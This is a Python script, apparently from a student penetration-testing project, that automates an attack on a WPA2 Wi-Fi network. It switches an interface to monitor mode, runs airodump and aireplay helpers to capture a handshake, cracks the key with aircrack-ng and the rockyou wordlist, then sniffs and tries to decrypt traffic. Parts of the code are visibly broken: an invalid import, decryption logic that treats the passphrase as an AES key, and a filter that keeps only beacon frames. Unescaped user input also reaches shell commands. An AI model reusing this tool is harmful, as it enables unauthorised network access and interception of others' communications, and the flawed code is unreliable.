import sys
import os
import os.path
from scapy.all import *
import subprocess as sub
import WPA2.py
from binascii import hexlify

class sniffer():
	def __init__(self):
		start = input("First time starting up? [Y/N]:")
		if start == "Y":
			# put everything in monitor mode when starting up
			print("Killing services")
			os.system("sudo airmon-ng check kill")
			print("Starting wlan1mon")
			os.system("sudo airmon-ng start wlan1 1")
			print("Done")
		print("Which wifi do you want to crack")
		self.wifi = input("Wifi name: ")
		self.find_mac()

	def find_mac(self):
		print("Finding Mac-Adress")
		os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >output.txt".format(self.wifi))
		wifi_list = open('output.txt', 'r').read()
		index = wifi_list.index('Address')
		self.mac = wifi_list[index + len('Address: '):index + len('Address: ') + 17]
		self.get_key()

	def get_key(self):
		# code for cracking the key
		# find key using the iv's in .cap file
		if not os.path.isfile("WPA_{}-01.cap".format(self.mac)):
			self.make_cap()
		print("Cracking the key")
		os.system("sudo aircrack-ng /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/WPA_{}-01.cap -w /home/kali/rockyou.txt>key_info.txt".format(self.mac))
		key_file = open("key_info.txt", "r").read()
		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
		self.key = ""
		while key_file[index] != ' ':
			self.key += key_file[index]
			index += 1
		print("Key has been found: {}".format(self.key))
		print("Starting to sniff")
		self.sniff_packets()

	def decrypt(self, packet):
		self.key = WPA2.key_to_matrix(self.key)
		nb_cols = len(self.key[0])

		rounds = 0

		if nb_cols == 4:
			rounds = 10
		elif nb_cols == 6:
			rounds = 12
		elif nb_cols == 8:
			rounds = 14

		encrypted_mess = hexlify(str(packet))
		unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.key, rounds)
		unencrypted_mess = self.filter_packets(unencrypted_mess)

		return 'from: ' + packet[0].addr3 + ' --> to: ' + packet[0].addr1 + '\nmessage: ' + unencrypted_mess

	def filtersniff(self, packet):
		# DIT MOET WAARSCHIJNLIJK HELEMAAL ANDERS ZIJN?
		"""
		if packet[0].addr1 == self.mac or packet[0].addr2 == self.mac or packet[0].addr3 == self.mac:
			iv = bytes_hex(packet[0].iv).decode('utf-8')
			wepdata = bytes_hex(packet[0].wepdata).decode('utf-8')
			iv = ' '.join(iv[i:i + 2] for i in range(0, len(iv), 2))
			wepdata = ' '.join(wepdata[i:i + 2] for i in range(0, len(wepdata), 2))
			unencrypted_message = RC4.decryption(self.key, wepdata, iv)
			unencrypted_message = self.filter_packets(unencrypted_message)
			return 'from: ' + packet[0].addr3 + ' --> to: ' + packet[0].addr1 + '\nmessage :' + unencrypted_message

		"""
		if packet.haslayer(Dot11Beacon):
			if packet[Dot11Beacon].network_stats()['ssid'] == '4B1':
				return packet

	def sniff_packets(self):
		# DIT OOK ANDERS
		sniff(iface='wlan1mon', lfilter=self.filtersniff, prn=self.decrypt)

	def filter_packets(self, message):
		alfabet = [chr(elem) for elem in range(48, 123)]
		filtered_message = ""

		for elem in message:
			if elem == " ":
				filtered_message += " "
			if elem in alfabet or elem.isdigit():
				filtered_message += elem
			else:
				continue

		if len(filtered_message) < 5:
			return ''

		return filtered_message

	def make_cap(self):
		process2 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AirodumpWPA2.py {}".format(self.mac)])
		process1 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AireplayWPA2.py {}".format(self.mac)])
		process1.wait()
		process2.wait()

sniffer()